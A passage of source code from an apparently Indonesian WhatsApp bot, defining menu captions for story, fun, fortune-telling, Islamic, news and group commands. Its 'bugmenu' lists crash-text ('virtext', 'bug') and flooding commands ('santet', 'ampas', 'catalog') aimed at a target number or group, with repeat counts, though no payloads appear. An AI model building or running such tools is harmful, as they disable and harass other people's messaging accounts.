╠➤ 𝐜𝐞𝐫𝐩𝐞𝐧 𝐩𝐞𝐫𝐬𝐚𝐡𝐚𝐛𝐚𝐭𝐚𝐧
╠➤ 𝐜𝐞𝐫𝐩𝐞𝐧 𝐩𝐞𝐭𝐮𝐚𝐥𝐚𝐧𝐠𝐚𝐧
╠➤ 𝐜𝐞𝐫𝐩𝐞𝐧 𝐫𝐚𝐦𝐚𝐝𝐡𝐚𝐧
╠➤ 𝐜𝐞𝐫𝐩𝐞𝐧 𝐫𝐞𝐦𝐚𝐣𝐚
╠➤ 𝐜𝐞𝐫𝐩𝐞𝐧 𝐫𝐞𝐧𝐮𝐧𝐠𝐚𝐧
╠➤ 𝐜𝐞𝐫𝐩𝐞𝐧 𝐫𝐢𝐧𝐝𝐮
╠➤ 𝐜𝐞𝐫𝐩𝐞𝐧 𝐫𝐨𝐡𝐚𝐧𝐢
╠➤ 𝐜𝐞𝐫𝐩𝐞𝐧 𝐫𝐨𝐦𝐚𝐧𝐭𝐢𝐬
╠➤ 𝐜𝐞𝐫𝐩𝐞𝐧 𝐬𝐚𝐬𝐭𝐫𝐚
╠➤ 𝐜𝐞𝐫𝐩𝐞𝐧 𝐬𝐞𝐝𝐢𝐡
╠➤ 𝐜𝐞𝐫𝐩𝐞𝐧 𝐬𝐞𝐣𝐚𝐫𝐚𝐡
╠➤ 𝐜𝐞𝐫𝐩𝐞𝐧 𝐬𝐥𝐢𝐜𝐞 𝐨𝐟 𝐥𝐢𝐟𝐞
╠➤ 𝐜𝐞𝐫𝐩𝐞𝐧 𝐭𝐞𝐫𝐣𝐞𝐦𝐚𝐡
╠➤ 𝐜𝐞𝐫𝐩𝐞𝐧 𝐭𝐡𝐫𝐢𝐥𝐥𝐞𝐫
╚════[ ꪶ⸸⁹⁹⁹𝗣𝗨𝗧𝗥𝗔-𝗞𝗘𝗟𝗔𝗡𝗔⁹⁹⁹⸸ꫂ͢ ]══════⊱

▬▭▬▭▬▭▬▭▬▬▭▬▭
 
 https://www.instagram.com/raehan1986/?hl=id
 
▬▭▬▭▬▭▬▭▬▬▭▬▭
 ╭━━━━━━━━━━━━━━━━╾•
 │⃟•╾ ◎ ${timeJak}
 │⃟•╾ ◎ ${timeMak}
 │⃟•╾ ◎ ${timeJay}
 ╰━━━━━━━━━━━━━━━╯

▬▭▬▭▬▭▬▭▬▬▭▬▭
`)
let cerpe = await cerpen(q)
var memek = await getBuffer(picak+`cerpen ${q}`)
await BossRaehan.send5ButImg(from, `⭔ 𝐓𝐢𝐭𝐥𝐞 : ${cerpe.title}\n⭔ 𝐀𝐮𝐭𝐡𝐨𝐫 : ${cerpe.author}\n⭔ 𝐂𝐚𝐭𝐞𝐠𝐨𝐫𝐲 : ${cerpe.kategori}\n⭔ 𝐏𝐚𝐬𝐬 𝐌𝐨𝐝𝐞𝐫𝐚𝐭𝐢𝐨𝐧 : ${cerpe.lolos}\n⭔ 𝐒𝐭𝐨𝐫𝐲 :\n${cerpe.cerita}`, `© ${ownername}`,memek, [{"urlButton": {"displayText": "YouTube Creator","url": `${youtube}`}}] )
}

break
//════════════════════════════//
case 'funnmenu': {
if (isBan) throw (from)

anu = `
▬▭▬▭▬▭▬▭▬▬▭▬▭

◎ 𝐋𝐢𝐛 : 𝐌𝐮𝐥𝐭𝐢-𝐃𝐞𝐯𝐢𝐜𝐞
◎ 𝐎𝐰𝐧𝐞𝐫 ${botname}
◎ 𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩 https://wa.me/6281528628870
◎ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 ${runtime(process.uptime())}
◎ 𝐒𝐞𝐥𝐚𝐦𝐚𝐭  ${salam}

▬▭▬▭▬▭▬▭▬▬▭▬▭

╔══════[ 𝐅𝐔𝐍𝐍 ]══════⊱
╠➤ 𝐁𝐀𝐆𝐀𝐈𝐌𝐀𝐍𝐀𝐊𝐀𝐇
╠➤ 𝐊𝐀𝐏𝐀𝐍𝐊𝐀𝐇
╠➤ 𝐁𝐈𝐒𝐀𝐊𝐀𝐇
╠➤ 𝐀𝐏𝐀𝐊𝐀𝐇
╠➤ 𝐖𝐀𝐍𝐆𝐘
╠➤ 𝐑𝐀𝐓𝐄
╠➤ 𝐂𝐄𝐊𝐆𝐀𝐍𝐓𝐄𝐍𝐆
╠➤ 𝐂𝐄𝐊𝐂𝐀𝐍𝐓𝐈𝐊
╠➤ 𝐆𝐀𝐍𝐓𝐄𝐍𝐆𝐂𝐄𝐊
╠➤ 𝐂𝐀𝐍𝐓𝐈𝐊𝐂𝐄𝐊
╠➤ 𝐒𝐀𝐍𝐆𝐄𝐂𝐄𝐊
╠➤ 𝐆𝐀𝐘𝐂𝐄𝐊
╠➤ 𝐂𝐄𝐊𝐆𝐀𝐘
╠➤ 𝐋𝐄𝐒𝐁𝐈𝐂𝐄𝐊
╠➤ 𝐇𝐀𝐋𝐀𝐇
╠➤ 𝐇𝐈𝐋𝐈𝐇
╠➤ 𝐇𝐔𝐋𝐔𝐇
╠➤ 𝐇𝐄𝐋𝐄𝐇
╠➤ 𝐇𝐎𝐋𝐎𝐇
╠➤ 𝐒𝐔𝐈𝐓𝐏𝐕𝐏
╚════[ ꪶ⸸⁹⁹⁹𝗣𝗨𝗧𝗥𝗔-𝗞𝗘𝗟𝗔𝗡𝗔⁹⁹⁹⸸ꫂ͢ ]══════⊱

▬▭▬▭▬▭▬▭▬▬▭▬▭
 
 https://www.instagram.com/raehan1986/?hl=id
 
▬▭▬▭▬▭▬▭▬▬▭▬▭
 ╭━━━━━━━━━━━━━━━━╾•
 │⃟•╾ ◎ ${timeJak}
 │⃟•╾ ◎ ${timeMak}
 │⃟•╾ ◎ ${timeJay}
 ╰━━━━━━━━━━━━━━━╯

▬▭▬▭▬▭▬▭▬▬▭▬▭`,
BossRaehan.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/60e2afbef5528557a9273.jpg'}, 
"contextInfo": {
"externalAdReply": {
"title": `©⏤͟͟͞ㄚ卂ㄥㄥ`,
"body":`Runtime ${runtime(process.uptime())}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UCnQANmWo4iOyC6q6psb5eVg`,
"thumbnailUrl": `https://telegra.ph/file/dbb1a0521d07b5eeb504c.jpg`
}}, caption: anu })
}
break
//════════════════════════════//
case 'bugmenu': {
if (isBan) throw (from)

anu = `
▬▭▬▭▬▭▬▭▬▬▭▬▭

◎ 𝐋𝐢𝐛 : 𝐌𝐮𝐥𝐭𝐢-𝐃𝐞𝐯𝐢𝐜𝐞
◎ 𝐎𝐰𝐧𝐞𝐫 ${botname}
◎ 𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩 https://wa.me/6281528628870
◎ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 ${runtime(process.uptime())}
◎ 𝐒𝐞𝐥𝐚𝐦𝐚𝐭  ${salam}

▬▭▬▭▬▭▬▭▬▬▭▬▭

╔══════[ 𝐕𝐈𝐑𝐓𝐄𝐗𝐓 ]══════⊱
╠➤ 𝐕𝐈𝐑𝐓𝐄𝐗𝐓1
╠➤ 𝐕𝐈𝐑𝐓𝐄𝐗𝐓2
╠➤ 𝐕𝐈𝐑𝐓𝐄𝐗𝐓3
╠➤ 𝐕𝐈𝐑𝐓𝐄𝐗𝐓4
╠➤ 𝐕𝐈𝐑𝐓𝐄𝐗𝐓5
╠➤ 𝐕𝐈𝐑𝐓𝐄𝐗𝐓6
╠➤ 𝐕𝐈𝐑𝐓𝐄𝐗𝐓7
╠➤ 𝐕𝐈𝐑𝐓𝐄𝐗𝐓8
╠➤ 𝐕𝐈𝐑𝐓𝐄𝐗𝐓9
╠➤ 𝐕𝐈𝐑𝐓𝐄𝐗𝐓10
╠══════[ 𝐁𝐔𝐆 ]══════⊱
╠➤ 𝐒𝐏𝐀𝐌
╠➤ 𝐁𝐔𝐆1
╠➤ 𝐁𝐔𝐆2
╠➤ 𝐁𝐔𝐆3
╠➤ 𝐁𝐔𝐆4
╠➤ 𝐁𝐔𝐆5
╠➤ 𝐁𝐔𝐆6
╠➤ 𝐁𝐔𝐆7
╠➤ 𝐏𝐎𝐋𝐋𝐈𝐍𝐆𝐘𝐔𝐊
╠➤ 𝐆𝐀𝐒𝐇𝐀𝐍
╠➤ 𝐁𝐔𝐆𝐓𝐀𝐆
╠➤ 𝐁𝐔𝐆𝐓𝐀𝐆𝐀𝐋𝐋 
╠➤ 𝐋𝐎𝐊𝐀𝐒
╠➤ 𝐂𝐀𝐓𝐀𝐋𝐎𝐆 
╠➤ 𝐃𝐎𝐂𝐔
╠➤ 𝐀𝐌𝐏𝐔𝐍𝐎𝐌
╠➤ 𝐃𝐀𝐂𝐀 
╠➤ 𝐃𝐔𝐂 
╠➤ 𝐃𝐔𝐂𝐔 
╠➤ 𝐓𝐑𝐎𝐋𝐈1
╠➤ 𝐓𝐑𝐎𝐋𝐈2 
╠➤ 𝐓𝐑𝐎𝐋𝐈3 
╠➤ 𝐉𝐀𝐃𝐈𝐁𝐔𝐆1 
╠➤ 𝐉𝐀𝐃𝐈𝐁𝐔𝐆2 
╠➤ 𝐉𝐀𝐃𝐈𝐁𝐔𝐆3
╠➤ 𝐉𝐀𝐃𝐈𝐁𝐔𝐆4 
╠➤ 𝐉𝐀𝐃𝐈𝐁𝐔𝐆5 
╠➤ 𝐁𝐔𝐆𝐒𝐓𝐈𝐂𝐊
╠➤ 𝐁𝐔𝐆𝐈𝐄
╠➤ 𝐁𝐔𝐆𝐋𝐎𝐊𝐀𝐒
╠➤ 𝐁𝐔𝐆𝐒𝐀𝐍𝐆𝐄
╠➤ 𝐁𝐔𝐆𝐊𝐎𝐍𝐓𝐀𝐊𝐊
╠➤ 𝐁𝐔𝐆𝐁𝐎𝐊𝐄𝐏2
╠➤ 𝐁𝐔𝐆𝐈𝐍𝐕𝐈𝐓𝐄 
╠➤ 𝐁𝐔𝐆𝐁𝐂𝐓𝐄𝐗𝐓
╚════[ ꪶ⸸⁹⁹⁹𝗣𝗨𝗧𝗥𝗔-𝗞𝗘𝗟𝗔𝗡𝗔⁹⁹⁹⸸ꫂ͢ ]══════⊱

▬▭▬▭▬▭▬▭▬▬▭▬▭

╔══════[ 𝐆𝐑𝐔𝐏 ]══════⊱
╠➤ 𝐒𝐀𝐍𝐓𝐄𝐓𝐃𝐈𝐀 [ 𝐂𝐨𝐧𝐭𝐨𝐡 : santetdia 628xxx@s.whatsapp.net|10|10s ]
╠➤ 𝐒𝐀𝐍𝐓𝐄𝐓𝐆𝐂 [ 𝐂𝐨𝐧𝐭𝐨𝐡 : santetgc 1237891xxxx@g.us|10|10s ]
╠➤ 𝐀𝐌𝐏𝐀𝐒1  [ 𝐂𝐨𝐧𝐭𝐨𝐡 : Ampas1 628xxx ]
╠➤ 𝐀𝐌𝐏𝐀𝐒2 [ 𝐂𝐨𝐧𝐭𝐨𝐡 : Ampas2 112674448xxx ]
╠➤ 𝐂𝐀𝐓𝐀𝐋𝐎𝐆𝐏𝐂 [ 𝐂𝐨𝐧𝐭𝐨𝐡 : catalogpc 628xxx@s.whatsapp.net|10|10s ]
╠➤ 𝐂𝐀𝐓𝐀𝐋𝐎𝐆𝐆𝐂 [ 𝐂𝐨𝐧𝐭𝐨𝐡 : cataloggc 1237891xxxx@g.us|10|10s ]
╚════[ ꪶ⸸⁹⁹⁹𝗣𝗨𝗧𝗥𝗔-𝗞𝗘𝗟𝗔𝗡𝗔⁹⁹⁹⸸ꫂ͢ ]══════⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭
 
 https://www.instagram.com/raehan1986/?hl=id
 
▬▭▬▭▬▭▬▭▬▬▭▬▭
 ╭━━━━━━━━━━━━━━━━╾•
 │⃟•╾ ◎ ${timeJak}
 │⃟•╾ ◎ ${timeMak}
 │⃟•╾ ◎ ${timeJay}
 ╰━━━━━━━━━━━━━━━╯
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
BossRaehan.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/60e2afbef5528557a9273.jpg'}, 
"contextInfo": {
"externalAdReply": {
"title": `©⏤͟͟͞ㄚ卂ㄥㄥ`,
"body":`Runtime ${runtime(process.uptime())}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UCnQANmWo4iOyC6q6psb5eVg`,
"thumbnailUrl": `https://telegra.ph/file/dbb1a0521d07b5eeb504c.jpg`
}}, caption: anu })
}
break
//════════════════════════════//
case 'primbonmenu': {
if (isBan) throw (from)

anu = `
▬▭▬▭▬▭▬▭▬▬▭▬▭

◎ 𝐋𝐢𝐛 : 𝐌𝐮𝐥𝐭𝐢-𝐃𝐞𝐯𝐢𝐜𝐞
◎ 𝐎𝐰𝐧𝐞𝐫 ${botname}
◎ 𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩 https://wa.me/6281528628870
◎ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 ${runtime(process.uptime())}
◎ 𝐒𝐞𝐥𝐚𝐦𝐚𝐭  ${salam}

▬▭▬▭▬▭▬▭▬▬▭▬▭

╔══════[ 𝐏𝐑𝐈𝐌𝐁𝐎𝐍 ]══════⊱
╠➤ 𝐍𝐎𝐌𝐎𝐑𝐇𝐎𝐊𝐈
╠➤ 𝐀𝐑𝐓𝐈𝐍𝐀𝐌𝐀
╠➤ 𝐀𝐑𝐓𝐈𝐌𝐈𝐌𝐏𝐈
╠➤ 𝐑𝐀𝐌𝐀𝐋𝐉𝐎𝐃𝐎𝐇
╠➤ 𝐑𝐀𝐌𝐀𝐋𝐉𝐎𝐃𝐎𝐇𝐁𝐀𝐋𝐈
╠➤ 𝐑𝐀𝐌𝐀𝐋𝐂𝐈𝐍𝐓𝐀 
╠➤ 𝐒𝐔𝐀𝐌𝐈𝐈𝐒𝐓𝐑𝐈 
╠➤ 𝐂𝐎𝐂𝐎𝐊𝐍𝐀𝐌𝐀
╠➤ 𝐑𝐀𝐌𝐀𝐋𝐂𝐈𝐍𝐓𝐀
╠➤ 𝐏𝐀𝐒𝐀𝐍𝐆𝐀𝐍
╠➤ 𝐉𝐀𝐃𝐈𝐀𝐍𝐍𝐈𝐊𝐀𝐇
╠➤ 𝐒𝐈𝐅𝐀𝐓𝐔𝐒𝐀𝐇𝐀
╠➤ 𝐑𝐄𝐙𝐄𝐊𝐈
╠➤ 𝐍𝐀𝐒𝐈𝐁
╠➤ 𝐏𝐄𝐊𝐄𝐑𝐉𝐀𝐀𝐍
╠➤ 𝐓𝐀𝐑𝐎𝐓
╠➤ 𝐏𝐄𝐍𝐘𝐀𝐊𝐈𝐓
╠➤ 𝐅𝐄𝐍𝐆𝐒𝐇𝐔𝐈
╠➤ 𝐇𝐀𝐑𝐈𝐁𝐀𝐈𝐊
╠➤ 𝐇𝐀𝐑𝐈𝐒𝐀𝐍𝐆𝐀𝐑
╠➤ 𝐇𝐀𝐑𝐈𝐒𝐈𝐀𝐋
╠➤ 𝐀𝐑𝐀𝐇𝐑𝐄𝐙𝐄𝐊𝐈
╠➤ 𝐍𝐀𝐆𝐀𝐇𝐀𝐑𝐈
╠➤ 𝐏𝐄𝐑𝐔𝐍𝐓𝐔𝐍𝐆𝐀𝐍
╠➤ 𝐖𝐄𝐓𝐎𝐍
╠➤ 𝐊𝐀𝐑𝐀𝐊𝐓𝐄𝐑
╠➤ 𝐒𝐇𝐈𝐎
╠➤ 𝐙𝐎𝐃𝐈𝐀𝐊
╠➤ 𝐌𝐀𝐒𝐀𝐒𝐔𝐁𝐔𝐑
╠➤ 𝐌𝐄𝐌𝐀𝐍𝐂𝐈𝐍𝐆
╠➤ 𝐊𝐄𝐁𝐄𝐑𝐔𝐍𝐓𝐔𝐍𝐆𝐀𝐍
╚════[ ꪶ⸸⁹⁹⁹𝗣𝗨𝗧𝗥𝗔-𝗞𝗘𝗟𝗔𝗡𝗔⁹⁹⁹⸸ꫂ͢ ]══════⊱

▬▭▬▭▬▭▬▭▬▬▭▬▭
 
 https://www.instagram.com/raehan1986/?hl=id
 
▬▭▬▭▬▭▬▭▬▬▭▬▭
 ╭━━━━━━━━━━━━━━━━╾•
 │⃟•╾ ◎ ${timeJak}
 │⃟•╾ ◎ ${timeMak}
 │⃟•╾ ◎ ${timeJay}
 ╰━━━━━━━━━━━━━━━╯

▬▭▬▭▬▭▬▭▬▬▭▬▭`,
BossRaehan.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/60e2afbef5528557a9273.jpg'}, 
"contextInfo": {
"externalAdReply": {
"title": `©⏤͟͟͞ㄚ卂ㄥㄥ`,
"body":`Runtime ${runtime(process.uptime())}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UCnQANmWo4iOyC6q6psb5eVg`,
"thumbnailUrl": `https://telegra.ph/file/dbb1a0521d07b5eeb504c.jpg`
}}, caption: anu })
}
break

case 'islamiyah': {
if (isBan) throw (from)

anu = `
▬▭▬▭▬▭▬▭▬▬▭▬▭

◎ 𝐋𝐢𝐛 : 𝐌𝐮𝐥𝐭𝐢-𝐃𝐞𝐯𝐢𝐜𝐞
◎ 𝐎𝐰𝐧𝐞𝐫 ${botname}
◎ 𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩 https://wa.me/6281528628870
◎ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 ${runtime(process.uptime())}
◎ 𝐒𝐞𝐥𝐚𝐦𝐚𝐭  ${salam}

▬▭▬▭▬▭▬▭▬▬▭▬▭

╔══════[ 𝐈𝐒𝐋𝐀𝐌𝐈𝐘𝐀𝐇 ]══════⊱
╠➤ 𝐈𝐐𝐑𝐀
╠➤ 𝐇𝐀𝐃𝐈𝐒𝐓
╠➤ 𝐀𝐋𝐐𝐔𝐑𝐀𝐍
╠➤ 𝐓𝐀𝐅𝐒𝐈𝐑𝐒𝐔𝐑𝐀𝐇
╠➤ 𝐉𝐔𝐙𝐀𝐌𝐌𝐀
╚════[ ꪶ⸸⁹⁹⁹𝗣𝗨𝗧𝗥𝗔-𝗞𝗘𝗟𝗔𝗡𝗔⁹⁹⁹⸸ꫂ͢ ]══════⊱

▬▭▬▭▬▭▬▭▬▬▭▬▭
 
 https://www.instagram.com/raehan1986/?hl=id
 
▬▭▬▭▬▭▬▭▬▬▭▬▭
 ╭━━━━━━━━━━━━━━━━╾•
 │⃟•╾ ◎ ${timeJak}
 │⃟•╾ ◎ ${timeMak}
 │⃟•╾ ◎ ${timeJay}
 ╰━━━━━━━━━━━━━━━╯

▬▭▬▭▬▭▬▭▬▬▭▬▭`,
BossRaehan.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/60e2afbef5528557a9273.jpg'}, 
"contextInfo": {
"externalAdReply": {
"title": `©⏤͟͟͞ㄚ卂ㄥㄥ`,
"body":`Runtime ${runtime(process.uptime())}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UCnQANmWo4iOyC6q6psb5eVg`,
"thumbnailUrl": `https://telegra.ph/file/dbb1a0521d07b5eeb504c.jpg`
}}, caption: anu })
}
break


case 'donasi': {
if (isBan) throw (from)

anu = `
▬▭▬▭▬▭▬▭▬▬▭▬▭

◎ 𝐋𝐢𝐛 : 𝐌𝐮𝐥𝐭𝐢-𝐃𝐞𝐯𝐢𝐜𝐞
◎ 𝐎𝐰𝐧𝐞𝐫 ${botname}
◎ 𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩 https://wa.me/6281528628870
◎ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 ${runtime(process.uptime())}
◎ 𝐒𝐞𝐥𝐚𝐦𝐚𝐭  ${salam}

▬▭▬▭▬▭▬▭▬▬▭▬▭

╔══════[ 𝐃𝐚𝐧𝐚 ]══════⊱
╠➤ wa.me/+6281528628870
╚════[ ꪶ⸸⁹⁹⁹𝗣𝗨𝗧𝗥𝗔-𝗞𝗘𝗟𝗔𝗡𝗔⁹⁹⁹⸸ꫂ͢ ]══════⊱

▬▭▬▭▬▭▬▭▬▬▭▬▭
 
 https://www.instagram.com/raehan1986/?hl=id
 
▬▭▬▭▬▭▬▭▬▬▭▬▭
 ╭━━━━━━━━━━━━━━━━╾•
 │⃟•╾ ◎ ${timeJak}
 │⃟•╾ ◎ ${timeMak}
 │⃟•╾ ◎ ${timeJay}
 ╰━━━━━━━━━━━━━━━╯

▬▭▬▭▬▭▬▭▬▬▭▬▭`,
BossRaehan.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/60e2afbef5528557a9273.jpg'}, 
"contextInfo": {
"externalAdReply": {
"title": `©⏤͟͟͞ㄚ卂ㄥㄥ`,
"body":`Runtime ${runtime(process.uptime())}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UCnQANmWo4iOyC6q6psb5eVg`,
"thumbnailUrl": `https://telegra.ph/file/dbb1a0521d07b5eeb504c.jpg`
}}, caption: anu })
}
break


case 'owner': {
if (isBan) throw (from)

anu = `
▬▭▬▭▬▭▬▭▬▬▭▬▭
◎ 𝐋𝐢𝐛 : 𝐌𝐮𝐥𝐭𝐢-𝐃𝐞𝐯𝐢𝐜𝐞
◎ 𝐎𝐰𝐧𝐞𝐫 ${botname}
◎ 𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩 https://wa.me/6281528628870
◎ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 ${runtime(process.uptime())}
◎ 𝐒𝐞𝐥𝐚𝐦𝐚𝐭  ${salam}

▬▭▬▭▬▭▬▭▬▬▭▬▭

╔══════[ 𝐎𝐰𝐧𝐞𝐫 ]══════⊱
╠➤ wa.me/6281528628870
╠➤ wa.me/6285349736408
╚════[ ꪶ⸸⁹⁹⁹𝗣𝗨𝗧𝗥𝗔-𝗞𝗘𝗟𝗔𝗡𝗔⁹⁹⁹⸸ꫂ͢ ]══════⊱


▬▭▬▭▬▭▬▭▬▬▭▬▭
 
 https://www.instagram.com/raehan1986/?hl=id
 
▬▭▬▭▬▭▬▭▬▬▭▬▭
 ╭━━━━━━━━━━━━━━━━╾•
 │⃟•╾ ◎ ${timeJak}
 │⃟•╾ ◎ ${timeMak}
 │⃟•╾ ◎ ${timeJay}
 ╰━━━━━━━━━━━━━━━╯

▬▭▬▭▬▭▬▭▬▬▭▬▭`,
BossRaehan.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/60e2afbef5528557a9273.jpg'}, 
"contextInfo": {
"externalAdReply": {
"title": `©⏤͟͟͞ㄚ卂ㄥㄥ`,
"body":`Runtime ${runtime(process.uptime())}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UCnQANmWo4iOyC6q6psb5eVg`,
"thumbnailUrl": `https://telegra.ph/file/dbb1a0521d07b5eeb504c.jpg`
}}, caption: anu })
}
break




case 'sc': {
if (isBan) throw (from)

anu = `
▬▭▬▭▬▭▬▭▬▬▭▬▭

◎ 𝐋𝐢𝐛 : 𝐌𝐮𝐥𝐭𝐢-𝐃𝐞𝐯𝐢𝐜𝐞
◎ 𝐎𝐰𝐧𝐞𝐫 ${botname}
◎ 𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩 https://wa.me/6281528628870
◎ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 ${runtime(process.uptime())}
◎ 𝐒𝐞𝐥𝐚𝐦𝐚𝐭  ${salam}

▬▭▬▭▬▭▬▭▬▬▭▬▭

🅂🄲 🄱🄴🄻🄸 🄳🄸 https://wa.me/6281528628870

▬▭▬▭▬▭▬▭▬▬▭▬▭

╔══════[ 𝐒𝐂 ]══════⊱
╠➤https://youtube.com/channel/UCnQANmWo4iOyC6q6psb5eVg
╠═══[ ꪶ⸸⁹⁹⁹𝗣𝗨𝗧𝗥𝗔-𝗞𝗘𝗟𝗔𝗡𝗔⁹⁹⁹⸸ꫂ͢ ]══════⊱
╠➤Https://facebook.com/raehan1986
╠═══[ ꪶ⸸⁹⁹⁹𝗣𝗨𝗧𝗥𝗔-𝗞𝗘𝗟𝗔𝗡𝗔⁹⁹⁹⸸ꫂ͢ ]══════⊱
╠➤https://www.instagram.com/raehan1986/?hl=id
╚═══[ ꪶ⸸⁹⁹⁹𝗣𝗨𝗧𝗥𝗔-𝗞𝗘𝗟𝗔𝗡𝗔⁹⁹⁹⸸ꫂ͢ ]══════⊱

▬▭▬▭▬▭▬▭▬▬▭▬▭`,
BossRaehan.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/60e2afbef5528557a9273.jpg'}, 
"contextInfo": {
"externalAdReply": {
"title": `©⏤͟͟͞ㄚ卂ㄥㄥ`,
"body":`Runtime ${runtime(process.uptime())}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UCnQANmWo4iOyC6q6psb5eVg`,
"thumbnailUrl": `https://telegra.ph/file/dbb1a0521d07b5eeb504c.jpg`
}}, caption: anu })
}
break




//════════════════════════════//
case 'beritanews': {
if (isBan) throw (from)

anu = `
▬▭▬▭▬▭▬▭▬▬▭▬▭

◎ 𝐋𝐢𝐛 : 𝐌𝐮𝐥𝐭𝐢-𝐃𝐞𝐯𝐢𝐜𝐞
◎ 𝐎𝐰𝐧𝐞𝐫 ${botname}
◎ 𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩 https://wa.me/6281528628870
◎ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 ${runtime(process.uptime())}
◎ 𝐒𝐞𝐥𝐚𝐦𝐚𝐭  ${salam}

▬▭▬▭▬▭▬▭▬▬▭▬▭
╔══════[ 𝐍𝐄𝐖𝐒 ]══════⊱
╠➤ 𝐌𝐄𝐑𝐃𝐄𝐊𝐀-𝐍𝐄𝐖𝐒
╠➤ 𝐊𝐎𝐍𝐓𝐀𝐍-𝐍𝐄𝐖𝐒 
╠➤ 𝐂𝐍𝐍-𝐍𝐄𝐖𝐒
╠➤ 𝐃𝐄𝐓𝐈𝐊-𝐍𝐄𝐖𝐒
╠➤ 𝐂𝐍𝐁𝐂-𝐍𝐄𝐖𝐒
╠➤ 𝐓𝐑𝐈𝐁𝐔𝐍-𝐍𝐄𝐖𝐒
╠➤ 𝐈𝐍𝐃𝐎𝐙𝐎𝐍𝐄-𝐍𝐄𝐖𝐒
╠➤ 𝐒𝐈𝐍𝐃𝐎-𝐍𝐄𝐖𝐒
╠➤ 𝐊𝐎𝐌𝐏𝐀𝐒-𝐍𝐄𝐖𝐒
╠➤ 𝐓𝐄𝐌𝐏𝐎-𝐍𝐄𝐖𝐒
╠➤ 𝐃𝐀𝐈𝐋𝐘-newsinews-𝐍𝐄𝐖𝐒
╠➤ 𝐎𝐊𝐄𝐙𝐎𝐍𝐄-𝐍𝐄𝐖𝐒
╠➤ 𝐀𝐍𝐓𝐀𝐑𝐀-𝐍𝐄𝐖𝐒
╠➤ 𝐅𝐀𝐉𝐀𝐑-𝐍𝐄𝐖𝐒
╚════[ ꪶ⸸⁹⁹⁹𝗣𝗨𝗧𝗥𝗔-𝗞𝗘𝗟𝗔𝗡𝗔⁹⁹⁹⸸ꫂ͢ ]══════⊱

▬▭▬▭▬▭▬▭▬▬▭▬▭
 
 https://www.instagram.com/raehan1986/?hl=id
 
▬▭▬▭▬▭▬▭▬▬▭▬▭
 ╭━━━━━━━━━━━━━━━━╾•
 │⃟•╾ ◎ ${timeJak}
 │⃟•╾ ◎ ${timeMak}
 │⃟•╾ ◎ ${timeJay}
 ╰━━━━━━━━━━━━━━━╯

▬▭▬▭▬▭▬▭▬▬▭▬▭`,
BossRaehan.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/60e2afbef5528557a9273.jpg'}, 
"contextInfo": {
"externalAdReply": {
"title": `©⏤͟͟͞ㄚ卂ㄥㄥ`,
"body":`Runtime ${runtime(process.uptime())}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UCnQANmWo4iOyC6q6psb5eVg`,
"thumbnailUrl": `https://telegra.ph/file/dbb1a0521d07b5eeb504c.jpg`
}}, caption: anu })
}
break
//════════════════════════════//
case 'groupmenu': {
if (isBan) throw (from)

anu = `
▬▭▬▭▬▭▬▭▬▬▭▬▭

◎ 𝐋𝐢𝐛 : 𝐌𝐮𝐥𝐭𝐢-𝐃𝐞𝐯𝐢𝐜𝐞
◎ 𝐎𝐰𝐧𝐞𝐫 ${botname}
◎ 𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩 https://wa.me/6281528628870
◎ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 ${runtime(process.uptime())}
◎ 𝐒𝐞𝐥𝐚𝐦𝐚𝐭  ${salam}

▬▭▬▭▬▭▬▭▬▬▭▬▭

╔══════[ 𝐆𝐑𝐎𝐔𝐏 ]══════⊱
╠➤ 𝐋𝐈𝐍𝐊𝐆𝐑𝐎𝐔𝐏
╠➤ 𝐄𝐏𝐇𝐄𝐌𝐄𝐑𝐀𝐋
╠➤ 𝐒𝐄𝐓𝐏𝐏𝐆𝐂
╠➤ 𝐒𝐄𝐓𝐏𝐏𝐆𝐂 /𝐅𝐔𝐋𝐋
╠➤ 𝐒𝐄𝐓𝐍𝐀𝐌𝐄 [ 𝐍𝐀𝐌𝐀 𝐆𝐑𝐔𝐏 ]
╠➤ 𝐆𝐑𝐎𝐔𝐏
╠➤ 𝐒𝐄𝐓𝐃𝐄𝐒𝐂
╠➤ 𝐄𝐃𝐈𝐓𝐈𝐍𝐅𝐎
╠➤ 𝐀𝐃𝐃
╠➤ 𝐊𝐈𝐂𝐊
╠➤ 𝐈𝐍𝐓𝐑𝐎
